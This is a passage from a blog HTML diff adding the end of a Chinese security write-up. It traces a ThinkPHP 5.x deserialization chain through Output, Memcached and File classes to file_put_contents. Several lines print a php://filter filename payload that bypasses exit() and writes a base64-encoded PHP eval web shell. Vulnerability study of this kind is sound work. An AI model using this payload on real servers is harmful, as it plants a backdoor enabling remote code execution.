+<p>返回一个数组<code>[&quot;a&quot;=&gt;&quot;admin&quot;]</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385130534-ca593a2e-d4ec-4b2a-8262-b6f7d678259c.png" alt="img"></p>
+<p>出来之后 我们对bindAttr数组做了遍历 取出了admin值 并且赋值给<code>$attr</code> 准备进入__call方法</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385270965-3c8c5977-cfd1-4096-8fe1-d43c5971ce20.png" alt="img"></p>
+<p>value为Output对象 attr为admin</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385400098-cb29f0b7-7658-41ce-971d-6192d5f6fed5.png" alt="img"></p>
+<p>继续跟进</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385455272-facd2168-2893-44ce-818c-5addd49162ca.png" alt="img"></p>
+<p>用array_unshift函数将方法名也就是getAttr加到参数数组中 最后为<code>[&quot;getAttr&quot;,&quot;admin&quot;]</code></p>
+<p>然后用<code>call_user_func_array()</code>调用自己的block方法</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385660127-4ad92565-a9da-4a18-b38e-213780816b13.png" alt="img"></p>
+<p>跟进该方法 调用了writeln方法 并且值为我们当作参数传入的数组内容</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385812207-c646114f-7e0f-4319-9968-573f7108e987.png" alt="img"></p>
+<p>继续跟进writeln 又调用了write方法</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385868106-38a09ecb-7388-41df-a310-a79fb86b0fd0.png" alt="img"></p>
+<p>那么我们全局搜索看看谁调用了write函数 在Memcached类找到了合适的write方法</p>
+<p>因此让Output类中<code>$this-&gt;handler</code>为Memecached对象即可 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386253172-ce3e25a5-224c-4c7f-af89-35174a14bc81.png" alt="img"></p>
+<p>这里又调用了set方法 我们继续set方法</p>
+<p>最后发现File类中调用了set方法 所以这里我们让Memcache类中的<code>$this-&gt;handler</code>为File对象即可</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386333208-33809789-92e0-4574-a19d-1f4c14c2760c.png" alt="img"></p>
+<p>继续向下走 我们可以看到这里有直接写php🐎的语句 但是有死亡exit()我们可以利用编解码绕过 <code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code></p>
+<p>这里就不过多赘述了 参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16849600.html">https://www.cnblogs.com/meng-han/p/16849600.html</a></p>
+<p>然后还有<code>file_put_contents()</code> 危险函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386596117-accfef1b-456e-4185-af8b-d5cd89c25aa6.png" alt="img"></p>
+<p><code>$filename</code>通过<code>getCacheKey</code>函数获得的 我们跟进</p>
+<p>这里的name为我们之前参数数组中两个值getAttr和admin拼接的 然后计算其md5值赋值为<code>$name</code></p>
+<p>为<code>63ac11a7699c5c57d85009296440d77a</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387227854-b8616d60-99b4-4d13-928f-2bbaed760a6a.png" alt="img"></p>
+<p>接着到<code>$this-&gt;options[&#39;path&#39;]</code> 这里我们是可控的 也就是文件名我们可控 设置为我们的特殊编解码paylaod</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387307842-5b351ecc-b1bb-49be-800b-f6629a6202ab.png" alt="img"></p>
+<p>文件最终名为<code>$name</code> 也就是之前计算的md5值 再加上<code>$this-&gt;options[&#39;path&#39;]</code>两部分构成的</p>
+<p>为<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</code></p>
+<p>虽然此时我们文件名可控了但是<code>$value</code>为true 也就是文件内容<code>$data</code>我们不可控 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387750421-cc16d9f2-abcd-4aae-b13b-45c0f2ea3ba7.png" alt="img"></p>
+<p>继续分析这里会调用setTagItem这个函数 我们跟进观察</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387860334-4f4aa100-87e2-40ed-8cbe-64c36ed272a7.png" alt="img"></p>
+<p>该函数又会调用一次set函数 那么此时<code>$value</code>的值我们是可控的 也就是传进来的<code>$name</code>也就是<code>$filename</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387939980-8e0ce116-2027-4287-a7db-6b69ee7afffb.png" alt="img"></p>
+<p>那么此时传入set的<code>$name</code>为<code>$key=tag_c4ca4238a0b923820dcc509a6f75849b</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388521425-d31d2d3d-c5e0-4c87-8991-4cc6f1569117.png" alt="img"></p>
+<p>但是这里还有一个问题 就是exit()死亡函数的绕过 我们写入文件的内容受到这个函数的影响</p>
+<p>并且内容就是我们的文件名 因此只需要我们将文件名构造为特殊的可以吞掉exit()的编码即可</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388214099-8cb10a8d-65bb-4999-98b7-64f2f9e0a06d.png" alt="img"></p>
+<p>所以会生成两个文件 只有第二个文件内容才是我们想要的</p>
+<p>并且第二个文件名为<code>&quot;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php&quot;+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php</code></p>
+<p>产出的文件名为：<code>a.php3b58a9545013e88c7186db11bb158c44.php</code></p>
+<p>这里文件名也有讲究 我们可以看到我们的文件名应该是<code>aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php&quot;+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php</code>这一坨才对 </p>
+<p>最后为什么只生成了我们想要的<code>a.php3b58a9545013e88c7186db11bb158c44.php</code></p>
+<p>我们将前面的一串base64字符整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成<code>a.php3b58a9545013e88c7186db11bb158c44.php</code>文件，从而就可以生成正常的文件名。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a></p>
+<p>至此分析完美撒花</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>不能只是一味的为了解题而去刷题不去深究真正的漏洞原因</p>
+<p>看了很多厉害师傅的博客 深深的e住了</p>
+<p>不把屎一样的东西搬出来抽象了 放在雨雀上自己看看就好了</p>
+<p>这也是为什么停了博客一个月了qwq，深思中。。。</p>
+<p>还有就是期末了 也e 要给时间复习了</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%BA%94%E3%80%81ThinkPHP5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn’t Laugh</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6619#toc-1">thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -954,98 +1364,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/post/eb0674ad.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://z1d10t.github.io/post/3edff1a9.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695400865185.png">
-      <meta itemprop="name" content="Z1d10t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Z1d10tのBlog">
-      <meta itemprop="description" content="邪王真眼是最强的！">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Z1d10tのBlog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/post/3edff1a9.html" class="post-title-link" itemprop="url">2023羊城杯WEB WP与复现学习</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-09-04 21:14:41" itemprop="dateCreated datePublished" datetime="2023-09-04T21:14:41+08:00">2023-09-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-09-07 22:57:45" itemprop="dateModified" datetime="2023-09-07T22:57:45+08:00">2023-09-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/" itemprop="url" rel="index"><span itemprop="name">各赛事WP</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>2023羊城杯WEB WP与复现学习</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/post/3edff1a9.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
